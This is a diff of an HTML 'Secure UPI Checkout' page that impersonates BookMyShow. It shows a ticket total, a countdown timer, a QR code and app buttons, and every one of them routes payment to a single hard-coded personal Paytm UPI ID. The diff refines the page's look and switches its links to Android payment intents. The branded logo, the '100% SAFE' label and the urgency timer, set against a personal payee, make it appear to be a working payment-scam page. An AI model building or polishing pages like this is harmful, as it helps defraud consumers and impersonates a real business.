@@ -5,118 +5,127 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Secure UPI Checkout</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://unpkg.com/lucide@latest"></script>
     <style>
-        body { background-color: #f9fafb; font-family: sans-serif; -webkit-tap-highlight-color: transparent; }
-        .animate-fade-in { animation: fadeIn 0.5s ease-out; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        body { background-color: #f3f4f6; font-family: -apple-system, sans-serif; -webkit-tap-highlight-color: transparent; }
+        .btn-shadow { box-shadow: 0 4px 14px 0 rgba(0, 0, 0, 0.1); }
+        .animate-up { animation: slideUp 0.4s ease-out; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
-    <div id="app">
-        <header class="bg-white border-b p-3 flex justify-between items-center sticky top-0 z-50 shadow-sm">
-            <div class="flex items-center gap-3">
-                <i data-lucide="arrow-left" class="w-5 h-5 text-gray-600"></i>
-                <img src="https://getlogo.net/wp-content/uploads/2020/04/bookmyshow-logo-vector-xs.png" class="h-6" alt="Logo">
+    <div class="max-w-md mx-auto min-h-screen flex flex-col">
+        <!-- Header -->
+        <header class="bg-white p-4 flex justify-between items-center border-b sticky top-0 z-10">
+            <div class="flex items-center gap-2">
+                <img src="https://getlogo.net/wp-content/uploads/2020/04/bookmyshow-logo-vector-xs.png" class="h-5" alt="BMS">
+                <span class="text-gray-300">|</span>
+                <span class="text-xs font-bold text-gray-500 uppercase tracking-tighter">Secure Checkout</span>
             </div>
-            <div class="flex items-center gap-1 bg-green-50 px-2 py-1 rounded-full border border-green-100">
-                <i data-lucide="shield-check" class="w-4 h-4 text-green-600"></i>
-                <span class="text-[10px] font-bold text-green-700">SECURE</span>
-            </div>
+            <div class="bg-green-100 text-green-700 px-2 py-1 rounded text-[10px] font-bold">100% SAFE</div>
         </header>
 
-        <main class="p-4 max-w-lg mx-auto w-full">
-            <div class="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden animate-fade-in">
-                <div class="bg-slate-50 p-6 text-center border-b">
-                    <p class="text-gray-500 text-xs font-bold uppercase mb-1">Total Payable</p>
-                    <h1 id="display-amount" class="text-4xl font-extrabold text-gray-900">₹1,000</h1>
-                    <div class="mt-3 inline-block bg-red-100 text-red-600 px-3 py-1 rounded-full text-xs font-bold" id="timer">
-                        Expiry: 15:00
-                    </div>
+        <main class="p-4 flex-1">
+            <div class="bg-white rounded-3xl overflow-hidden shadow-sm animate-up">
+                <!-- Price Section -->
+                <div class="bg-indigo-600 p-8 text-center text-white">
+                    <p class="text-indigo-100 text-xs font-bold uppercase mb-1">Amount to Pay</p>
+                    <h1 id="amount-text" class="text-5xl font-black">₹1,000</h1>
+                    <p id="timer" class="mt-4 bg-indigo-500/50 inline-block px-4 py-1 rounded-full text-xs font-medium">Expires in 15:00</p>
                 </div>
 
                 <div class="p-6">
-                    <div class="flex flex-col items-center mb-6">
-                        <div class="p-2 border-2 border-dashed border-gray-200 rounded-xl mb-3">
-                            <img id="qr-code" src="" alt="QR" class="w-44 h-44">
+                    <!-- QR Code Section -->
+                    <div class="flex flex-col items-center mb-8">
+                        <div class="bg-white p-2 border-2 border-gray-100 rounded-2xl mb-2">
+                            <img id="qr-img" src="" class="w-48 h-48" alt="Scan QR">
                         </div>
-                        <p class="text-[11px] text-gray-400 font-medium flex items-center gap-1 uppercase">
-                            <i data-lucide="qr-code" class="w-3 h-3"></i> Scan to pay
-                        </p>
+                        <p class="text-[10px] text-gray-400 font-bold uppercase tracking-widest">Scan QR with any app</p>
                     </div>
 
-                    <div class="bg-gray-50 border rounded-xl p-3 mb-6 flex items-center justify-between">
+                    <!-- UPI ID Box -->
+                    <div class="bg-gray-50 border border-gray-100 rounded-2xl p-4 mb-8 flex items-center justify-between">
                         <div>
-                            <p class="text-[10px] font-bold text-gray-400 uppercase">UPI ID</p>
-                            <p class="text-sm font-bold text-gray-800">paytm.s1h6t6g@pty</p>
+                            <p class="text-[10px] text-gray-400 font-bold uppercase">UPI ID</p>
+                            <p id="upi-val" class="text-sm font-bold text-gray-800">paytm.s1h6t6g@pty</p>
                         </div>
-                        <button onclick="copyUpi()" id="copy-btn" class="bg-indigo-600 text-white px-4 py-2 rounded-lg text-xs font-bold">COPY</button>
+                        <button onclick="copyUpi()" id="copy-btn" class="bg-gray-800 text-white text-[10px] font-black px-4 py-2 rounded-xl">COPY</button>
                     </div>
 
-                    <div class="space-y-3">
-                        <p class="text-xs font-bold text-gray-500 uppercase">Select App to Pay</p>
-                        <a id="phonepe-btn" href="#" class="flex items-center justify-between p-3 border rounded-xl border-purple-200 bg-purple-50/30">
-                            <div class="flex items-center gap-3">
-                                <img src="https://cdn.razorpay.com/app/phonepe.svg" class="w-8 h-8">
-                                <span class="font-bold text-gray-700">PhonePe</span>
-                            </div>
-                            <span class="text-[10px] bg-purple-100 text-purple-600 px-2 py-1 rounded font-bold uppercase">Fast</span>
+                    <!-- Primary Pay Button -->
+                    <a id="main-pay-btn" href="#" class="block w-full bg-indigo-600 text-white text-center py-4 rounded-2xl font-black text-lg btn-shadow mb-8 active:scale-95 transition-transform">
+                        PAY NOW (ANY APP)
+                    </a>
+
+                    <!-- Individual Apps -->
+                    <p class="text-[10px] font-black text-gray-400 uppercase mb-4 text-center tracking-widest text-indigo-600">Or Select Specific App</p>
+                    <div class="grid grid-cols-3 gap-4">
+                        <a id="link-phonepe" href="#" class="flex flex-col items-center gap-2">
+                            <img src="https://cdn.razorpay.com/app/phonepe.svg" class="w-12 h-12 rounded-xl shadow-sm border border-gray-50">
+                            <span class="text-[10px] font-bold text-gray-600">PhonePe</span>
                         </a>
-                        <a id="paytm-btn" href="#" class="flex items-center gap-3 p-3 border rounded-xl hover:bg-gray-50">
-                            <img src="https://cdn.razorpay.com/app/paytm.svg" class="w-8 h-8">
-                            <span class="font-bold text-gray-700">Paytm</span>
+                        <a id="link-paytm" href="#" class="flex flex-col items-center gap-2">
+                            <img src="https://cdn.razorpay.com/app/paytm.svg" class="w-12 h-12 rounded-xl shadow-sm border border-gray-50">
+                            <span class="text-[10px] font-bold text-gray-600">Paytm</span>
                         </a>
-                        <a id="gpay-btn" href="#" class="flex items-center gap-3 p-3 border rounded-xl hover:bg-gray-50">
-                            <img src="https://cdn.razorpay.com/app/google_pay.svg" class="w-8 h-8">
-                            <span class="font-bold text-gray-700">Google Pay</span>
+                        <a id="link-gpay" href="#" class="flex flex-col items-center gap-2">
+                            <img src="https://cdn.razorpay.com/app/google_pay.svg" class="w-12 h-12 rounded-xl shadow-sm border border-gray-100">
+                            <span class="text-[10px] font-bold text-gray-600">GPay</span>
                         </a>
                     </div>
                 </div>
             </div>
         </main>
+
+        <!-- Footer -->
+        <footer class="p-6 text-center opacity-30">
+            <img src="https://shopindiaonline.in/wp-content/uploads/2023/09/payment-logo-icons-1024x272-1.png" class="h-4 mx-auto grayscale" alt="UPI">
+        </footer>
     </div>
 
     <script>
         const UPI_ID = "paytm.s1h6t6g@pty";
-        let amount = localStorage.getItem("selectedTotalPrice") || 1000;
+        const amount = localStorage.getItem("selectedTotalPrice") || 1000;
+        const note = encodeURIComponent("Payment for Ticket");
 
-        // Update UI
-        document.getElementById('display-amount').innerText = "₹" + Number(amount).toLocaleString('en-IN');
+        // UI Update
+        document.getElementById('amount-text').innerText = "₹" + Number(amount).toLocaleString('en-IN');
         
-        // Links Logic
-        const upiUrl = `upi://pay?pa=${UPI_ID}&pn=TicketPayment&am=${amount}&cu=INR`;
-        const ppPayload = btoa(JSON.stringify({
-            contact: { vpa: UPI_ID },
-            p2pPaymentCheckoutParams: { note: "Ticket Payment", initialAmount: amount * 100, currency: "INR" }
-        }));
+        // Standard UPI link
+        const upiLink = `upi://pay?pa=${UPI_ID}&pn=TicketPayment&am=${amount}&cu=INR&tn=${note}`;
         
-        document.getElementById('qr-code').src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(upiUrl)}`;
-        document.getElementById('phonepe-btn').href = `phonepe://native?data=${encodeURIComponent(ppPayload)}&id=p2ppayment`;
-        document.getElementById('paytm-btn').href = `paytmmp://cash_wallet?pa=${UPI_ID}&pn=Payment&am=${amount}&cu=INR`;
-        document.getElementById('gpay-btn').href = `tez://upi/pay?pa=${UPI_ID}&pn=Payment&am=${amount}&cu=INR`;
+        // Android Intents (These are most powerful for mobile)
+        const gPayIntent = `intent://pay?pa=${UPI_ID}&pn=Payment&am=${amount}&cu=INR&tn=${note}#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end`;
+        const phonePeIntent = `intent://pay?pa=${UPI_ID}&pn=Payment&am=${amount}&cu=INR&tn=${note}#Intent;scheme=upi;package=com.phonepe.app;end`;
+        const paytmIntent = `intent://pay?pa=${UPI_ID}&pn=Payment&am=${amount}&cu=INR&tn=${note}#Intent;scheme=upi;package=net.one97.paytm;end`;
+
+        // Setting Links
+        document.getElementById('qr-img').src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(upiLink)}`;
+        document.getElementById('main-pay-btn').href = upiLink;
+        document.getElementById('link-gpay').href = gPayIntent;
+        document.getElementById('link-phonepe').href = phonePeIntent;
+        document.getElementById('link-paytm').href = paytmIntent;
 
         function copyUpi() {
             navigator.clipboard.writeText(UPI_ID);
             const btn = document.getElementById('copy-btn');
-            btn.innerText = "COPIED!";
-            btn.classList.replace('bg-indigo-600', 'bg-green-600');
+            btn.innerText = "COPIED";
+            btn.classList.replace('bg-gray-800', 'bg-green-600');
             setTimeout(() => {
                 btn.innerText = "COPY";
-                btn.classList.replace('bg-green-600', 'bg-indigo-600');
+                btn.classList.replace('bg-green-600', 'bg-gray-800');
             }, 2000);
         }
 
-        // Timer
-        let time = 900;
+        // Timer Logic
+        let timer = 900;
+        const timerEl = document.getElementById('timer');
         setInterval(() => {
-            if(time <= 0) return;
-            time--;
-            const m = Math.floor(time/60);
-            const s = time%60;
-            document.getElementById('timer').innerText = `Expiry: ${m}:${s < 10 ? '0'+s : s}`;
+            if(timer <= 0) return;
+            timer--;
+            const m = Math.floor(timer/60);
+            const s = timer%60;
+            timerEl.innerText = `Expires in ${m}:${s < 10 ? '0'+s : s}`;
         }, 1000);
-
-        lucide.createIcons();
     </script>
 </body>
 </html>
